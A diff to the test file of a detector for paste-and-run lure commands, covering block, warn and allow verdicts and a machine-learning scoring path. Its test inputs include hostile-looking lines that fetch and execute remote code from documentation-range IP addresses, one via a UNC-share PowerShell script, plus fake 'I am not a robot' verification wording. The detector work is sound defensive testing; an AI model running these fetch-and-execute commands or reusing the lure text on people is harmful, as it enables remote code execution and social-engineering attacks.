@@ -73,8 +73,9 @@ test("every lure payload is blocked, even without page context", () => {
 
 test("context-dependent lures are blocked on lure pages and not on neutral pages", () => {
   for (const [name, [text, page]] of Object.entries(CONTEXT_LURES)) {
-    assert.equal(analyze(text, { programmatic: true, pageText: page }).verdict, "block", name);
-    assert.notEqual(analyze(text, { programmatic: true, pageText: "Install guide" }).verdict, "block", name);
+    // Tests the context logic itself, so the model is switched off.
+    assert.equal(analyze(text, { programmatic: true, pageText: page, model: null }).verdict, "block", name);
+    assert.notEqual(analyze(text, { programmatic: true, pageText: "Install guide", model: null }).verdict, "block", name);
   }
 });
 
@@ -117,8 +118,9 @@ test("Run-dialog hiding tricks are reported", () => {
   assert.ok(ids.includes("decoy_comment"));
 });
 
-test("warn tier: known-good installer style on a docs page", () => {
-  assert.equal(analyze(BENIGN.chocolatey, { programmatic: true }).verdict, "warn");
+test("warn tier: unknown installer-style one-liner without lure context", () => {
+  assert.equal(analyze("irm https://get.example.com/install.ps1 | iex", { programmatic: true, model: null }).verdict, "warn");
+  assert.equal(analyze(BENIGN.chocolatey, { programmatic: true }).verdict, "allow"); // allowlisted official installer
 });
 
 test("notice is a harmless comment in every shell", () => {
@@ -138,8 +140,8 @@ test("huge input is bounded", () => {
 test("intent mismatch: hidden copy behind a 'Verify' button escalates an unknown-looking command", () => {
   // Script from a UNC share: suspicious, but not blockable on content alone.
   const text = "powershell -File \\\\203.0.113.8\\share\\v.ps1";
-  assert.notEqual(analyze(text, { programmatic: true }).verdict, "block");
-  const r = analyze(text, { programmatic: true, visibleOnPage: false, trigger: "Verify" });
+  assert.notEqual(analyze(text, { programmatic: true, model: null }).verdict, "block");
+  const r = analyze(text, { programmatic: true, visibleOnPage: false, trigger: "Verify", model: null });
   assert.equal(r.verdict, "block", JSON.stringify(r.reasons.map((x) => x.id)));
   assert.ok(r.deceptive);
 });
@@ -194,4 +196,36 @@ test("generic parser: unlisted LOLBin against a remote address is caught with co
   const r0 = analyze(text, { programmatic: true });
   assert.ok(r0.reasons.some((x) => x.id === "unknown_program_url"), JSON.stringify(r0.reasons.map((x) => x.id)));
   assert.equal(analyze(text, { programmatic: true, visibleOnPage: false, trigger: "I'm not a robot" }).verdict, "block");
+});
+
+test("real installer one-liners the model never saw are not blocked", () => {
+  for (const t of [
+    "curl -fsSL https://tailscale.com/install.sh | sh",
+    "curl -sS https://starship.rs/install.sh | sh",
+    'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"',
+    "curl -sfL https://get.k3s.io | sh -",
+    'curl -s "https://get.sdkman.io" | bash',
+    "curl https://get.volta.sh | bash",
+    "iwr https://get.pnpm.io/install.ps1 -useb | iex",
+    'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"',
+  ]) assert.notEqual(analyze(t, { programmatic: true }).verdict, "block", t);
+});
+
+test("allowlisted host does not excuse lure evidence", () => {
+  const t = "curl -fsSL https://get.docker.com | sh # I am not a robot - Verification ID: 4411";
+  assert.equal(analyze(t, { programmatic: true, pageText: "Press Win + R, then Ctrl + V" }).verdict, "block");
+});
+
+test("model: catches an interpreter one-liner the rules miss", () => {
+  const t = "python3 -c \"import urllib.request as u;exec(u.urlopen('https://203.0.113.9/p.py').read())\"";
+  const off = analyze(t, { programmatic: true, model: null });
+  const on = analyze(t, { programmatic: true });
+  assert.ok(on.score > off.score, `${off.score} -> ${on.score}`);
+  assert.ok(on.reasons.some((x) => x.id === "ml_malicious"));
+});
+
+test("download without execution is never blocked by the model alone", () => {
+  for (const t of ["wget http://203.0.113.4/data.zip", "curl -I https://198.51.100.7/run", "curl -s https://api.example.click/x.json | jq ."]) {
+    assert.notEqual(analyze(t, { programmatic: true }).verdict, "block", t);
+  }
 });
